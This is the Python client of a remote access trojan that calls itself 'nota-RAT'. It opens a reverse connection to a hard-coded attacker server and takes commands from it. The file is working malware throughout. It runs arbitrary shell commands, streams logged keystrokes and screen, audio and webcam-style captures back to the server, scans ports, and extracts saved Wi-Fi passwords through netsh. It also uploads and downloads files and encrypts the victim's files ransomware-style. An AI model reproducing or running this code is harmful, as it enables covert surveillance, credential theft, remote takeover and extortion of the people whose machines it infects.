import socket, argparse, os, time, subprocess, re, cv2, pyautogui, datetime
import numpy as np
import sounddevice as sd
from scipy.io.wavfile import write
from win32api import GetSystemMetrics
from threading import Thread
from cryptography.fernet import Fernet
from vidstream import ScreenShareClient
from pynput.keyboard import Key, Listener


parser = argparse.ArgumentParser(
    description="nota-RAT, python reverse shell using sockets."
)

parser.add_argument("host", default= "xn--6pw65a019d.xyz", nargs="?", help="Address of the Server.")

parser.add_argument(
    "-p", "--port", default=421, help="Port the Server is running on.", type=int
)

args = parser.parse_args()
SERVER_HOST = args.host
SERVER_PORT = args.port
BUFFER_SIZE = 1024 * 128 
SEPARATOR = "<sep>"
keyz = Fernet.generate_key()
secret_key = keyz


''' Colors '''
MAIN = '\033[38;5;50m'
PLOAD = '\033[38;5;119m'
GREEN = '\033[38;5;47m'
BLUE = '\033[0;38;5;12m'
ORANGE = '\033[0;38;5;214m'
RED = '\033[1;31m'
END = '\033[0m'
BOLD = '\033[1m'


''' MSG Prefixes '''
INFO = f'{MAIN}Info{END}'
EXIT = f'{MAIN}Exited{END}'
WARN = f'{ORANGE}Warning{END}'
IMPORTANT = WARN = f'{ORANGE}Important{END}'
FAILED = f'{RED}Fail{END}'
DEBUG = f'{ORANGE}Debug{END}'
INPUT = f'{BLUE}Input{END}'
INFO = f'{MAIN}Info{END}'


s = socket.socket()
s.connect((SERVER_HOST, SERVER_PORT))

while True:
    command = s.recv(BUFFER_SIZE).decode()
    if command == "exit":
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        disconnected_msg = " disconnected quietly"
        disconnected_msg = f"\n{IPAddr}{disconnected_msg}"
        s.send(disconnected_msg.encode())
        break
    if command == "get live":
        sender = ScreenShareClient("192.168.3.76", 423)
        p = Thread(target=sender.start_stream)
        p.start()
    if command == "stop live":
        sender.stop_stream() 
    if command == "start local portscanner":
        port_range = s.recv(BUFFER_SIZE).decode()
        port_range = int(port_range)
        startTime = time.time()
        open_ports = 0
        ports_list = str()
        for i in range(0, port_range):
            hostname = socket.gethostname()
            host = "192.168.3.10"
            port = i
            timeout_seconds = 1
            port_scanner_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            port_scanner_socket.settimeout(timeout_seconds)
            result = port_scanner_socket.connect_ex((host,int(port)))
            if result == 0:
                new_port =(f"\n[{INFO}] Host: {host}, Port: {port}{END}")
                ports_list = ports_list + new_port
            else:
                continue
            port_scanner_socket.close()
            open_ports += 1

        ports_list = str(ports_list)
        executionTime = (time.time() - startTime)
        executionTime = int(executionTime)
        s.send((f'{str(ports_list)}\n[{INFO}] Open ports: {END}{str(open_ports)}\n[{INFO}] Execution time in seconds:  {str(executionTime)}\n').encode())
    if command == "start keylogger":
        LOGGER_HOST = args.host
        LOGGER_PORT = 422
        logger = socket.socket()
        logger.connect((LOGGER_HOST, LOGGER_PORT))  
        wordz = str()    
        def keylogger_loop():
            def press(key):
                global wordz
                wordz += str(key)
                if key == Key.space or key == Key.enter:
                    contents = f"\n{wordz}\n"
                    contents = contents.replace("'", "")
                    contents = contents.replace("Key.space", "")
                    contents = contents.replace("Key.backspace", "")
                    contents = contents.replace("Key.shift", "")
                    contents = contents.replace("Key.alt", "")
                    contents = contents.replace("Key.enter", "")
                    contents = contents.replace("Key.alt_gr", "")
                    contents = contents.replace("Key.alt_l", "")
                    contents = contents.replace("Key.alt_r", "")
                    contents = contents.replace("Key.caps_lock", "")
                    contents = contents.replace("Key.cmd", "")
                    contents = contents.replace("Key.cmd_l", "")
                    contents = contents.replace("Key.cmd_r", "")
                    contents = contents.replace("Key.ctrl", "")
                    contents = contents.replace("Key.ctrl_l", "")
                    contents = contents.replace("Key.ctrl_r", "")
                    contents = contents.replace("Key.delete", "")
                    contents = contents.replace("Key.down", "")
                    contents = contents.replace("Key.end", "")
                    contents = contents.replace("Key.esc", "")
                    contents = contents.replace("Key.f1", "")
                    contents = contents.replace("Key.f2", "")
                    contents = contents.replace("Key.f3", "")
                    contents = contents.replace("Key.f4", "")
                    contents = contents.replace("Key.f5", "")
                    contents = contents.replace("Key.f6", "")
                    contents = contents.replace("Key.f7", "")
                    contents = contents.replace("Key.f8", "")
                    contents = contents.replace("Key.f9", "")
                    contents = contents.replace("Key.f10", "")
                    contents = contents.replace("Key.f11", "")
                    contents = contents.replace("Key.f12", "")
                    contents = contents.replace("Key.f13", "")
                    contents = contents.replace("Key.f14", "")
                    contents = contents.replace("Key.f15", "")
                    contents = contents.replace("Key.f16", "")
                    contents = contents.replace("Key.f17", "")
                    contents = contents.replace("Key.f18", "")
                    contents = contents.replace("Key.f19", "")
                    contents = contents.replace("Key.f20", "")
                    contents = contents.replace("Key.home", "")
                    contents = contents.replace("Key.insert", "")
                    contents = contents.replace("Key.left", "")
                    contents = contents.replace("Key.menu", "")
                    contents = contents.replace("Key.num_lock", "")
                    contents = contents.replace("Key.page_down", "")
                    contents = contents.replace("Key.page_up", "")
                    contents = contents.replace("Key.pause", "")
                    contents = contents.replace("Key.print_screen", "")
                    contents = contents.replace("Key.scroll_lock", "")
                    contents = contents.replace("Key.right", "")
                    contents = contents.replace("Key.shift_l", "")
                    contents = contents.replace("Key.shift_r", "")
                    contents = contents.replace("Key.tab", "")
                    contents = contents.replace("Key.up", "")
                    date_now = str(datetime.datetime.now())
                    contents =  "\n" + date_now + contents
                    logger.send(contents.encode())
                    wordz = str()
            while True:
                if command == "stop keylogger":
                    logger.close()
                    break
                with Listener(
                        on_press=press,) as listener:
                    listener.join()
        keyzlogger_loop = Thread(target=keylogger_loop)
        keyzlogger_loop.daemon = True
        keyzlogger_loop.start()
    if command == "take screenshot":
        image = pyautogui.screenshot()
        image = cv2.cvtColor(np.array(image),
                     cv2.COLOR_RGB2BGR)
        cv2.imwrite("screenshot.png", image)
        filename = "screenshot.png"
        if filename in os.listdir():
            with open(filename, "rb") as f:
                data = f.read()
                dataLen = len(data)
                s.send(dataLen.to_bytes(4,'big'))
                s.send(data)
            f.close()
        os.remove("screenshot.png")
    if command == "record screen":
        def screenrecorder():
            time_stop = s.recv(BUFFER_SIZE).decode()
            time_stop = int(time_stop)
            SCREEN_SIZE = (GetSystemMetrics(0), GetSystemMetrics(1))
            fource = cv2.VideoWriter_fourcc(*'XVID')
            out = cv2.VideoWriter('recording.mp4', fource, 10.0, (SCREEN_SIZE))

            fps = 20
            prev = 0

            start = time.time()

            while True:
                if time.time() > start + time_stop: 
                    cv2.destroyAllWindows()
                    out.release()
                    break
                time_elapsed = time.time()-prev
                img = pyautogui.screenshot()
                if time_elapsed > 1.0/fps:
                    prev = time.time()
                    frame = np.array(img)
                    frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
                    out.write(frame)
            filename = "recording.mp4"
            if filename in os.listdir():
                with open(filename, "rb") as f:
                    data = f.read()
                    dataLen = len(data)
                    s.send(dataLen.to_bytes(4,'big'))
                    s.send(data)
                f.close()
        screenrecorderz = Thread(target=screenrecorder)
        screenrecorderz.daemon = True
        screenrecorderz.start()
    if command == "send command":
        cwd = os.getcwd()
        s.send(cwd.encode())
        new_command = s.recv(BUFFER_SIZE).decode()
        splited_command = new_command.split()
        if splited_command[0].lower() == "cd":
            try:
                os.chdir(' '.join(splited_command[1:]))
            except FileNotFoundError as e:
                output = str(e)
            else:
                output = ""
        else:
            output = subprocess.getoutput(new_command)
        message = f"\r{GREEN}{output}{END}{SEPARATOR}{cwd}"
        s.send(message.encode())
    if command == "send commands":
        running = True
        cwd = os.getcwd()
        s.send(cwd.encode())
        while running:
            new_command = s.recv(BUFFER_SIZE).decode()
            splited_command = new_command.split()
            if new_command == "exit":
                break
            if splited_command[0].lower() == "cd":
                try:
                    os.chdir(' '.join(splited_command[1:]))
                except FileNotFoundError as e:
                    output = str(e)
                else:
                    output = ""
            else:
                output = subprocess.getoutput(new_command)
            cwd = os.getcwd()
            message = f"\r{GREEN}{output}{END}{SEPARATOR}{cwd}"
            s.send(message.encode())
    if command == "encrypt files":
        files = []
        for file in os.listdir():
            if file == "log.txt":
                continue
            if file == "sys64.exe":
                continue
            if file == "desktop.ini":
                continue
            if os.path.isfile(file):
                files.append(file)
        for file in files:
            with open(file, "rb") as thefile:
                contents = thefile.read()
            contents_encrypted = Fernet(keyz).encrypt(contents)
            with open(file, "wb")   as thefile:
                thefile.write(contents_encrypted)
        secret_key = keyz
        s.send(f"[{INFO}] files encrypted successfully".encode())
    if command == "decrypt files":
        for file in files:
            with open(file, "rb") as thefile:
                contents = thefile.read()
            contents_decrypted = Fernet(secret_key).decrypt(contents)
            with open(file, "wb") as thefile:
                thefile.write(contents_decrypted)
        s.send(f"[{INFO}] files decrpyted successfully".encode())
    if command == "record mic":
        fs = 44100
        seconds = s.recv(BUFFER_SIZE).decode()
        seconds = int(seconds)
        myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
        sd.wait()
        write('output.wav', fs, myrecording)
        filename = "output.wav"
        if filename in os.listdir():
            with open(filename, "rb") as f:
                data = f.read()
                dataLen = len(data)
                s.send(dataLen.to_bytes(4,'big'))
                s.send(data)
            f.close()
        os.remove("output.wav")
    if command == "get wifi":
        command_output = subprocess.run(["netsh", "wlan", "show", "profiles"], capture_output = True).stdout.decode()
        profile_names = (re.findall("All User Profile     : (.*)\r", command_output))

        wifi_list = []
        wifi_list_profiles = str()
    
        if len(profile_names) != 0:
            for name in profile_names:
                wifi_profile = {}
                profile_info = subprocess.run(["netsh", "wlan", "show", "profile", name], capture_output = True).stdout.decode()
                if re.search("Security key           : Absent", profile_info):
                    continue
                else:
                    wifi_profile["ssid"] = name
                    profile_info_pass = subprocess.run(["netsh", "wlan", "show", "profile", name, "key=clear"], capture_output = True).stdout.decode()
                    password = re.search("Key Content            : (.*)\r", profile_info_pass)
                    if password == None:
                        wifi_profile["password"] = None
                    else:
                        wifi_profile["password"] = password[1]
                    wifi_list.append(wifi_profile) 
        if wifi_list == []:
            s.send((f"[{IMPORTANT}] no wifi profiles found{END}").encode())   
        if wifi_list != []:
            for x in range(len(wifi_list)):
                wifi_list_new = f"[{INFO}] {wifi_list[x]}\n"
                wifi_list_profiles = wifi_list_profiles + wifi_list_new
            s.send((wifi_list_profiles).encode())
    if command == "get file":
        filename = s.recv(BUFFER_SIZE).decode()
        if filename in os.listdir():
            with open(filename, "rb") as f:
                data = f.read()
                dataLen = len(data)
                s.send(dataLen.to_bytes(4,'big'))
                s.send(data)
            f.close()
    if command == "send file":
        filename = s.recv(BUFFER_SIZE).decode()
        remaining = int.from_bytes(s.recv(4),'big')
        f = open(filename,"wb")
        while remaining:
            data = s.recv(min(remaining,4096))
            remaining -= len(data)
            f.write(data)
        f.close()
    if command == "/getlive":
        sender = ScreenShareClient(SERVER_HOST, 423)
        t = Thread(target=sender.start_stream)
        t.start()
    if command == "/stoplive":
        sender.stop_stream()  
        
s.close()